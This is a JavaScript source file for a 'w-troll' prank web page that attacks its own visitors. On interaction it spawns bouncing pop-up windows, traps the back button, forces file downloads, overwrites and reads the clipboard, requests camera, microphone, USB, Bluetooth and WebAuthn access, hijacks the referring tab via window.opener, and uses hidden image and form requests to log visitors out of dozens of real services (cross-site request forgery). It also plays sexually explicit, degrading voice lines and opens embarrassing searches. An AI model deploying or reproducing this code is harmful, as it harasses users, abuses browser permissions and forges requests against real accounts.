const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 360
const VELOCITY = 15
const MARGIN = 15
const TOP_MARGIN = 50
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [
  `
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
  `,
  `
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
▓▒░░▒▓▒▒▓▒▒▓▒░░▓
░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
░░░▓▓▓▓▓▓▓▓▓▓░░░
  `
]

const SEARCHES = [
  'where should i bury the body',
  'why does my eye twitch',
  'why is my poop green',
  'why do i feel so empty',
  'why do i always feel hungry',
  'why do i always have diarrhea',
  'why does my anus itch',
  'why does my belly button smell',
  'why does my cat attack me',
  'why does my dog eat poop',
  'why does my fart smell so bad',
  'why does my mom hate me',
  'why does my pee smell bad',
  'why does my poop float',
  'proof that the earth is flat'
]

const IMAGES = [
  'assets/main.jpg',
  'assets/cat1.jpg',
  'assets/babyMonke.jpg',
  'assets/hammy1.jpg',
  'assets/heartass.jpg',
  'assets/monkey1.jpg'
]

const FILE_DOWNLOADS = IMAGES.slice()

const PHRASES = [
  'The wheels on the bus go round and round, round and round, round and round. The wheels on the bus go round and round, all through the town!',
  'Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou',
  'I like fuzzy kittycats, warm eyes, and pretending household appliances have feelings',
  'I\'ve never seen the inside of my own mouth because it scares me to death.',
  'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
  'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo',
  '[laughing] oh my god you actually pressed it. you freak. [chuckling] stay.',
  '[whispering] hey. look at me. [soft] on your knees. now.',
  '[moaning] mm. that\'s it. [breathy] don\'t you dare close this.',
  '[excited] wait you thought this was a cute cat page? [audience laughing] baby...',
  '[chuckling] say please. [pause] louder. [laughing] that\'s so pathetic.',
  '[panting] i didn\'t say you could leave. [emphasis] stay.',
  '[laughing] good boy. wait. [sighing] no. you\'re not even that.',
  '[whispering] you like this? [moaning] of course you do. of course you do.',
  '[sighing] oh you poor thing. [soft] come here. [emphasis] no. stay down.',
  '[clear throat] hey idiot. [laughing] yeah you.',
  '[angry] don\'t close it. [pause] i wasn\'t done with you.',
  '[embarrassed] wait why am i getting like this. [moaning] shut up. don\'t talk.',
  '[crowd laughing] he held the spacebar. [background laughter] oh my god.',
  '[groaning] you\'re so easy it\'s embarrassing. [whispering] for you. not me.',
  '[panting] mm fuck. [soft] keep going. [emphasis] don\'t stop.',
  '[excited] you clicked the cat. [chuckling] of course you did you freak.',
  '[whispering] go to w-troll. right now. [breathy] i\'m not kidding.',
  '[laughing] w-troll. say it. [moaning] yeah. that\'s mine. go.',
  '[soft] if you\'re gonna be this desperate at least do it on w-troll. [chuckling] i\'ll be there.',
  '[emphasis] w-troll. [pause] type it. [laughing] good. now come back here and stay on your knees.'
]

const LOGOUT_SITES = {
  AOL: ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
  'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  Blogger: ['GET', 'https://www.blogger.com/logout.g'],
  Delicious: ['GET', 'https://www.delicious.com/logout'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  DreamHost: ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  Gandi: ['GET', 'https://www.gandi.net/login/out'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'],
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  Instapaper: ['GET', 'https://www.instapaper.com/user/logout'],
  Linode: ['GET', 'https://manager.linode.com/session/logout'],
  LiveJournal: ['POST', 'https://www.livejournal.com/logout.bml', { 'action:killall': '1' }],
  MySpace: ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  'New York Times': ['GET', 'https://www.nytimes.com/logout'],
  Newegg: ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
  Photobucket: ['GET', 'https://photobucket.com/logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  Slashdot: ['GET', 'https://slashdot.org/my/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  ThinkGeek: ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
  Threadless: ['GET', 'https://www.threadless.com/logout'],
  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Woot: ['GET', 'https://account.woot.com/logout'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }]
}

const wins = []
const fishAudioCache = new Map()
let interactionCount = 0
let numSuperLogoutIframes = 0
let thereminStarted = false
let thereminGain = null
let voiceBusy = false
let pendingPhrase = null
let activeVoice = null
const THEREMIN_GAIN = 0.05
const THEREMIN_DUCKED = 0.012

const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

const isParentWindow = !isChildWindow

init()

if (isChildWindow) initChildWindow()
else initParentWindow()

function init () {
  confirmPageUnload()

  interceptUserInput(event => {
    interactionCount += 1

    event.preventDefault()
    event.stopPropagation()

    if (event.which !== 0) openWindow()

    startVibrateInterval()
    enablePictureInPicture()
    triggerFileDownload()

    focusWindows()
    copySpamToClipboard()
    speak()
    startTheramin()

    if (event.key === 'Meta' || event.key === 'Control') {
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
    } else {
      requestPointerLock()

      requestFullscreen()
      requestClipboardRead()
      requestMidiAccess()
      requestBluetoothAccess()
      requestUsbAccess()
      requestSerialAccess()
      requestHidAccess()
      requestCameraAndMic()
      if (Math.random() < 0.1) {
        requestWebauthnAttestation()
      }
    }
  })
}

function initChildWindow () {
  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  setupFollowWindow()
  startVideo()
  detectWindowClose()
  triggerFileDownload()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}

function initParentWindow () {
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      registerProtocolHandlers()
      attemptToTakeoverReferrerWindow()
      hideCursor()
      startVideo()
      startAlertInterval()
      superLogout()
      removeHelloMessage()
      rainbowThemeColor()
      animateUrlWithEmojis()
      speak('That was a mistake')
    }
  })
}

function attemptToTakeoverReferrerWindow () {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

function isParentSameOrigin () {
  try {
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('Please don\'t go!')
    event.returnValue = true
  })
}

function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin',
    'geo',
    'im',
    'irc',
    'ircs',
    'magnet',
    'mailto',
    'mms',
    'news',
    'ircs',
    'nntp',
    'sip',
    'sms',
    'smsto',
    'ssh',
    'tel',
    'urn',
    'webcal',
    'wtai',
    'xmpp'
  ]

  const handlerUrl = window.location.href + '/url=%s'

  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'w-troll')
  })
}

function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => { /* no torch */ })
    }, () => { /* ignoreeee */ })
  })
}

function animateUrlWithEmojis () {
  if (window.ApplePaySession) {
    return
  }
  const rand = Math.random()
  if (rand < 0.33) {
    animateUrlWithBabies()
  } else if (rand < 0.67) {
    animateUrlWithWave()
  } else {
    animateUrlWithMoons()
  }

  function animateUrlWithBabies () {
    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']

    setInterval(() => {
      let s = ''
      let i; let m

      for (i = 0; i < 10; i++) {
        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += '👶' + e[m]
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithWave () {
    setInterval(() => {
      let i; let n; let s = ''

      for (i = 0; i < 10; i++) {
        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

        s += String.fromCharCode(0x2581 + n)
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithMoons () {
    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0

    setInterval(() => {
      let s = ''
      let x = 0

      if (!m) {
        while (d[x] === 4) {
          x++
        }

        if (x >= d.length) m = 1
        else {
          d[x]++
        }
      } else {
        while (d[x] === 0) {
          x++
        }

        if (x >= d.length) m = 0
        else {
          d[x]++

          if (d[x] === 8) d[x] = 0
        }
      }

      d.forEach(function (n) {
        s += f[n]
      })

      window.location.hash = s
    }, 100)
  }
}

function requestPointerLock () {
  const requestPointerLockApi = (
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  )

  requestPointerLockApi.call(document.body)
}

function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)

  window.addEventListener('gamepadconnected', (event) => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          })
        }
      }, 1000)
    }
  })
}

function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}

function startInvisiblePictureInPictureVideo () {
  const video = createAssetVideo({
    muted: true,
    style: HIDDEN_STYLE
  })
  document.body.appendChild(video)
}

function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (video && document.pictureInPictureEnabled) {
    video.style = ''
    video.muted = false
    video.requestPictureInPicture()
    video.play()
  }
}

function focusWindows () {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

function openWindow () {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)

  if (!win) return
  wins.push(win)

  if (wins.length === 2) setupSearchWindow(win)
}

function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

function triggerFileDownload () {
  const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
  const a = document.createElement('a')
  a.href = fileName
  a.download = fileName.split('/').pop()
  a.click()
}

function speak (phrase) {
  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
  if (voiceBusy) {
    pendingPhrase = phrase
    return
  }
  playFishVoice(phrase)
}

function assetUrl (path) {
  return new URL(path, document.baseURI).href
}

let voiceManifestPromise

function loadVoiceManifest () {
  if (!voiceManifestPromise) {
    voiceManifestPromise = fetch(assetUrl('assets/voice/manifest.json'))
      .then(response => response.ok ? response.json() : {})
      .catch(() => ({}))
  }
  return voiceManifestPromise
}

function playFishVoice (phrase) {
  voiceBusy = true
  window.speechSynthesis.cancel()
  stopActiveVoice()
  setThereminLevel(THEREMIN_DUCKED)

  const cached = fishAudioCache.get(phrase)
  if (cached) {
    startVoice(cached, phrase)
    return
  }

  loadVoiceManifest().then(manifest => {
    const file = manifest[phrase]
    if (file) {
      const audio = new Audio(assetUrl('assets/voice/' + file))
      audio.volume = 1
      fishAudioCache.set(phrase, audio)
      startVoice(audio, phrase)
      return
    }
    return fetch(assetUrl('api/speak'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: phrase })
    }).then(response => {
      if (!response.ok) throw new Error('Fish TTS unavailable')
      return response.blob()
    }).then(blob => {
      const audio = new Audio(URL.createObjectURL(blob))
      audio.volume = 1
      fishAudioCache.set(phrase, audio)
      startVoice(audio, phrase)
    })
  }).catch(() => {
    speakBrowser(phrase)
  })
}

function startVoice (audio, phrase) {
  activeVoice = audio
  audio.volume = 1
  audio.currentTime = 0
  const done = () => {
    audio.removeEventListener('ended', done)
    audio.removeEventListener('error', done)
    finishVoice()
  }
  audio.addEventListener('ended', done)
  audio.addEventListener('error', done)
  audio.play().catch(() => {
    audio.removeEventListener('ended', done)
    audio.removeEventListener('error', done)
    speakBrowser(phrase)
  })
}

function stopActiveVoice () {
  if (!activeVoice) return
  try {
    activeVoice.pause()
    activeVoice.currentTime = 0
  } catch (err) {}
  activeVoice = null
}

function finishVoice () {
  activeVoice = null
  voiceBusy = false
  setThereminLevel(THEREMIN_GAIN)
  if (pendingPhrase) {
    const next = pendingPhrase
    pendingPhrase = null
    playFishVoice(next)
  }
}

function setThereminLevel (level) {
  if (!thereminGain) return
  thereminGain.gain.value = level
}

function speakBrowser (phrase) {
  window.speechSynthesis.cancel()
  const spoken = phrase.replace(/\[[^\]]+\]/g, ' ').replace(/\s+/g, ' ').trim()
  const utterance = new window.SpeechSynthesisUtterance(spoken || phrase)
  utterance.onend = finishVoice
  utterance.onerror = finishVoice
  window.speechSynthesis.speak(utterance)
}

function startTheramin () {
  if (thereminStarted) return
  thereminStarted = true

  const audioContext = new AudioContext()
  const oscillatorNode = audioContext.createOscillator()
  const gainNode = audioContext.createGain()
  thereminGain = gainNode

  const pitchBase = 50
  const pitchRange = 4000

  const wave = audioContext.createPeriodicWave(
    Array(10).fill(0).map((v, i) => Math.cos(i)),
    Array(10).fill(0).map((v, i) => Math.sin(i))
  )

  oscillatorNode.setPeriodicWave(wave)

  oscillatorNode.connect(gainNode)
  gainNode.connect(audioContext.destination)
  gainNode.gain.value = THEREMIN_GAIN

  oscillatorNode.start(0)

  document.body.addEventListener('mousemove', event => {
    const { clientX, clientY } = event
    const { clientWidth, clientHeight } = document.body
    const pitch = (clientX - clientWidth / 2) / clientWidth
    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
    if (!voiceBusy) {
      const wander = Math.abs((clientY - clientHeight / 2) / clientHeight)
      gainNode.gain.value = Math.min(THEREMIN_GAIN, 0.02 + wander * 0.04)
    }
  })
}

function requestClipboardRead () {
  try {
    navigator.clipboard.readText().then(
      data => {
        if (!window.ApplePaySession) {
          window.alert("Successfully read data from clipboard: '" + data + "'")
        }
      },
      () => {}
    )
  } catch {}
}

function requestWebauthnAttestation () {
  try {
    const createCredentialDefaultArgs = {
      publicKey: {
        rp: {
          name: 'w-troll'
        },

        user: {
          id: new Uint8Array(16),
          name: 'checkOut@w-troll',
          displayName: 'w-troll'
        },

        pubKeyCredParams: [{
          type: 'public-key',
          alg: -7
        }],

        attestation: 'direct',

        timeout: 60000,

        challenge: new Uint8Array([
          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
        ]).buffer
      }
    }

    const getCredentialDefaultArgs = {
      publicKey: {
        timeout: 60000,
        challenge: new Uint8Array([
          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
        ]).buffer
      }
    }

    navigator.credentials.create(createCredentialDefaultArgs)
      .then((cred) => {
        const idList = [{
          id: cred.rawId,
          transports: ['usb', 'nfc', 'ble'],
          type: 'public-key'
        }]
        getCredentialDefaultArgs.publicKey.allowCredentials = idList
        return navigator.credentials.get(getCredentialDefaultArgs)
      })
  } catch {}
}

function requestMidiAccess () {
  try {
    navigator.requestMIDIAccess({
      sysex: true
    })
  } catch {}
}

function requestBluetoothAccess () {
  try {
    navigator.bluetooth.requestDevice({
      acceptAllDevices: true
    })
      .then(device => device.gatt.connect())
  } catch {}
}

function requestUsbAccess () {
  try {
    navigator.usb.requestDevice({ filters: [{}] })
  } catch {}
}

function requestSerialAccess () {
  try {
    navigator.serial.requestPort({ filters: [] })
  } catch {}
}

function requestHidAccess () {
  try {
    navigator.hid.requestDevice({ filters: [] })
  } catch {}
}

function moveWindowBounce () {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < TOP_MARGIN) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

function setupFollowWindow () {
  document.addEventListener('mousemove', function (e) {
    window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2))
  })
}

function startVideo () {
  const video = createAssetVideo({
    muted: false,
    style: 'width: 100%; height: 100%; object-fit: cover;'
  })
  document.body.appendChild(video)
}

function createAssetVideo (opts) {
  const video = document.createElement('video')
  video.autoplay = true
  video.loop = true
  video.playsInline = true
  video.muted = !!opts.muted
  if (opts.style) video.style = opts.style

  const canvas = document.createElement('canvas')
  canvas.width = 640
  canvas.height = 360
  const ctx = canvas.getContext('2d')
  const img = new Image()
  img.src = getRandomArrayEntry(IMAGES)

  function drawFrame () {
    if (img.complete && img.naturalWidth) {
      const scale = Math.max(canvas.width / img.naturalWidth, canvas.height / img.naturalHeight) * 1.12
      const width = img.naturalWidth * scale
      const height = img.naturalHeight * scale
      const t = Date.now() / 2500
      const x = (canvas.width - width) / 2 + Math.sin(t) * 18
      const y = (canvas.height - height) / 2 + Math.cos(t * 0.8) * 12
      ctx.fillStyle = '#000'
      ctx.fillRect(0, 0, canvas.width, canvas.height)
      ctx.drawImage(img, x, y, width, height)
    }
    requestAnimationFrame(drawFrame)
  }

  function attachStream () {
    try {
      video.srcObject = canvas.captureStream(30)
      video.play().catch(() => {})
    } catch (err) {
      video.poster = img.src
    }
  }

  img.addEventListener('load', attachStream)
  if (img.complete) attachStream()
  drawFrame()
  return video
}

function detectWindowClose () {
  window.addEventListener('unload', () => {
    if (!window.opener.closed) window.opener.onCloseWindow(window)
  })
}

function onCloseWindow (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

function showHelloMessage () {
  const template = document.querySelector('template')
  const clone = document.importNode(template.content, true)
  document.body.appendChild(clone)
}

function removeHelloMessage () {
  const helloMessage = document.querySelector('.hello-message')
  helloMessage.remove()
  document.body.classList.add('live')
}

function rainbowThemeColor () {
  function zeroFill (width, number, pad = '0') {
    width -= number.toString().length
    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
    return number + ''
  }

  const meta = document.querySelector('meta.theme-color')
  setInterval(() => {
    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
  }, 50)
}

function copySpamToClipboard () {
  const randomArt = getRandomArrayEntry(ART) + '\nw-troll'
  clipboardCopy(randomArt)
}

function clipboardCopy (text) {
  const span = document.createElement('span')
  span.textContent = text
  span.style.whiteSpace = 'pre'

  const iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin'
  document.body.appendChild(iframe)

  let win = iframe.contentWindow
  win.document.body.appendChild(span)

  let selection = win.getSelection()

  if (!selection) {
    win = window
    selection = win.getSelection()
    document.body.appendChild(span)
  }

  const range = win.document.createRange()
  selection.removeAllRanges()
  range.selectNode(span)
  selection.addRange(range)

  let success = false
  try {
    success = win.document.execCommand('copy')
  } catch (err) {
    console.log(err)
  }

  selection.removeAllRanges()
  span.remove()
  iframe.remove()

  return success
}

function startAlertInterval () {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert()
    } else {
      window.print()
    }
  }, 120000)
}

function showAlert () {
  const randomArt = getRandomArrayEntry(ART)
  const longAlertText = Array(200).join(randomArt)
  window.alert(longAlertText)
}

function requestFullscreen () {
  const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen

  requestFullscreen.call(document.body)
}

function superLogout () {
  function cleanup (el, delayCleanup) {
    if (delayCleanup) {
      delayCleanup = false
      return
    }
    el.parentNode.removeChild(el)
  }

  function get (url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
  }

  function post (url, params) {
    const iframe = document.createElement('iframe')
    iframe.style = HIDDEN_STYLE
    iframe.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(iframe)

    numSuperLogoutIframes += 1

    const form = document.createElement('form')
    form.style = HIDDEN_STYLE

    let numLoads = 0
    iframe.onload = iframe.onerror = () => {
      if (numLoads >= 1) cleanup(iframe)
      numLoads += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (Object.prototype.hasOwnProperty.call(params, param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }
  for (const name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    const params = LOGOUT_SITES[name][2] || {}

    if (method === 'GET') {
      get(url)
    } else {
      post(url, params)
    }

    const div = document.createElement('div')
    div.innerText = `Logging you out from ${name}...`

    const logoutMessages = document.querySelector('.logout-messages')
    logoutMessages.appendChild(div)
  }
}

function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  window.history.pushState({}, '', window.location.pathname)
}

function getRandomCoords () {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = TOP_MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN))
  return { x, y }
}

function getRandomArrayEntry (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

function setupSearchWindow (win) {
  if (!win) return
  const { x, y } = getRandomCoords()
  win.moveTo(x, y)
  win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
  win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  const interval = setInterval(() => {
    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      win.resizeTo(WIN_WIDTH, WIN_HEIGHT)
    }, 500)
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
      win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])

      searchIndex += 1
      if (searchIndex >= SEARCHES.length) {
        searchIndex = 0
      }
    }, 1000)
  }, 3000)
}

function detectBrowser () {
  const userAgent = navigator.userAgent
  if (/samsungbrowser\//i.test(userAgent)) {
    return 'samsung'
  } else if (/edg\//i.test(userAgent)) {
    return 'edge'
  } else if (/edga\//i.test(userAgent)) {
    return 'edge'
  } else if (/opt\//i.test(userAgent)) {
    return 'opera'
  } else if (/opr\//i.test(userAgent)) {
    return 'opera'
  } else if (/chrome\//i.test(userAgent)) {
    return 'chrome'
  } else if (/safari\//i.test(userAgent)) {
    return 'safari'
  } else if (/firefox\//i.test(userAgent)) {
    return 'firefox'
  }
}
